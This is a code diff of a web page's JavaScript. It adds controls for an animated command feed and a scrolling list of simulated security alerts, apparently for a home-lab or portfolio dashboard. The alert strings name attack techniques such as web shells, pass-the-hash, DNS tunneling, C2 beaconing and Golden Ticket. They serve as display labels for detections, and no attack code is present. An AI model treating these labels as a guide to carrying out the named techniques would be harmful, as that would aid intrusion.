+      btn.innerHTML = this.paused ? '&#9654; Resume' : '&#9646;&#9646; Pause';
+      btn.style.color = this.paused ? '#3ecf8e' : '#565c6e';
+    }
+    if (!this.paused) {
+      // Resume typing if mid-character
+      var lines = this.body.querySelectorAll('.cmd-line');
+      var last = lines[lines.length - 1];
+      if (last && last._resume) {
+        last._resume();
+        last._resume = null;
+      } else {
+        this.next();
       }
     }
+  },
 
-    body.scrollTop = body.scrollHeight;
-    idx++;
-    
-    const delay = a.level >= 12 ? 800 : a.level >= 10 ? 1200 : 1800;
-    setTimeout(addAlert, delay + Math.random() * 600);
+  setSpeed: function(s) {
+    this.speed = s;
+    document.querySelectorAll('.cmd-speed-btn').forEach(function(b) {
+      b.style.color = parseFloat(b.dataset.speed) === s ? '#00d4aa' : '#565c6e';
+    });
   }
+};
 
-  setTimeout(addAlert, 600);
-})(); // <-- Properly closes the function scope loop context
-</script>
-</script>
+// Fix the onclick handlers to use Feed methods
+document.addEventListener('DOMContentLoaded', function() {
+  try {
+    // Wire up tab buttons
+    document.querySelectorAll('.cmd-tab-btn').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        Feed.switchTab(btn.dataset.tab);
+      });
+    });
 
+    // Wire up speed buttons
+    document.querySelectorAll('.cmd-speed-btn').forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        Feed.setSpeed(parseFloat(btn.dataset.speed));
+      });
+    });
+
+    // Wire up pause button
+    var pauseBtn = document.getElementById('cmd-pause');
+    if (pauseBtn) {
+      pauseBtn.addEventListener('click', function() { Feed.togglePause(); });
+    }
+
+    // Hover to pause
+    var feedWrap = document.querySelector('.cmd-feed');
+    if (feedWrap) {
+      var hovPaused = false;
+      feedWrap.addEventListener('mouseenter', function() {
+        if (!Feed.paused) { Feed.togglePause(); hovPaused = true; }
+      });
+      feedWrap.addEventListener('mouseleave', function() {
+        if (hovPaused && Feed.paused) { Feed.togglePause(); hovPaused = false; }
+      });
+    }
+
+    // Start the feed
+    Feed.init();
+
+    // Alert feed
+    var alertBody = document.getElementById('alert-body');
+    if (alertBody) {
+      var alerts = [
+        {time:'08:44:24', level:6,  lvlClass:'lvl-6',  desc:'Simple shell.php command execution.'},
+        {time:'08:45:00', level:14, lvlClass:'lvl-14', desc:'LATERAL MOVEMENT: Multiple web shell commands — active attack chain'},
+        {time:'08:50:12', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — NTLM auth, possible pass-the-hash'},
+        {time:'08:50:12', level:5,  lvlClass:'lvl-6',  desc:'Logon failure - Unknown user or bad password.'},
+        {time:'09:44:09', level:3,  lvlClass:'lvl-3',  desc:'C2 simulator check-in observed'},
+        {time:'09:44:23', level:3,  lvlClass:'lvl-3',  desc:'Suricata: ET INFO Python BaseHTTP ServerBanner'},
+        {time:'09:45:07', level:10, lvlClass:'lvl-10', desc:'Suspicious DNS query to tunnel.local — possible DNS tunneling'},
+        {time:'09:45:13', level:12, lvlClass:'lvl-12', desc:'High volume DNS queries to tunnel domain — DNS tunneling likely'},
+        {time:'10:17:58', level:12, lvlClass:'lvl-12', desc:'Possible C2 beaconing: 5+ check-ins from same source/90s'},
+        {time:'10:49:39', level:6,  lvlClass:'lvl-6',  desc:'New file created in /tmp — possible attacker persistence'},
+        {time:'10:50:12', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — sadmin NTLM possible pass-the-hash'},
+        {time:'05:39:41', level:6,  lvlClass:'lvl-6',  desc:'Kerberos service ticket requested — encryption type 0x17 (RC4)'},
+        {time:'05:55:08', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — sadmin NTLM possible pass-the-hash'},
+        {time:'05:56:58', level:12, lvlClass:'lvl-12', desc:'Possible C2 beaconing: 5+ check-ins from same source/90s'},
+        {time:'14:32:41', level:12, lvlClass:'lvl-12', desc:'New Windows Service Created — binary dropped via Admin Shares'},
+        {time:'14:33:10', level:14, lvlClass:'lvl-14', desc:'LATERAL MOVEMENT: Multiple web shell commands — active attack chain'},
+        {time:'15:32:41', level:12, lvlClass:'lvl-12', desc:'Golden Ticket: New service created from windows root path'},
+        {time:'15:33:05', level:6,  lvlClass:'lvl-6',  desc:'Successful Remote Logon — Kerberos auth Type 3 from Kali'},
+      ];
+      var alertIdx = 0;
+      function addAlert() {
+        try {
+        var a = alerts[alertIdx % alerts.length];
+        var row = document.createElement('div');
+        row.className = 'alert-row';
+        row.style.opacity = '0';
+        row.style.transition = 'opacity 0.4s';
+        row.innerHTML =
+          '<span class="alert-time">' + a.time + '</span>' +
+          '<span class="alert-level ' + a.lvlClass + '">' + a.level + '</span>' +
+          '<span class="alert-desc">' + a.desc + '</span>';
+        alertBody.appendChild(row);
+        setTimeout(function() { row.style.opacity = '1'; }, 20);
+        // Remove synchronously - no deferred removal to avoid infinite loop
+        while (alertBody.children.length > 14) {
+          alertBody.removeChild(alertBody.firstChild);
+        }
+        alertBody.scrollTop = alertBody.scrollHeight;
+        alertIdx++;
+        var delay = a.level >= 12 ? 900 : a.level >= 10 ? 1400 : 2000;
+        setTimeout(addAlert, delay + Math.random() * 500);
+        } catch(e) { console.error('Alert feed error:', e); setTimeout(addAlert, 2000); }
+      }
+      setTimeout(addAlert, 800);
+    }
+
+  } catch(e) {
+    console.error('Feed setup error:', e);
+  }
+});
+</script>
 </body>
 </html>
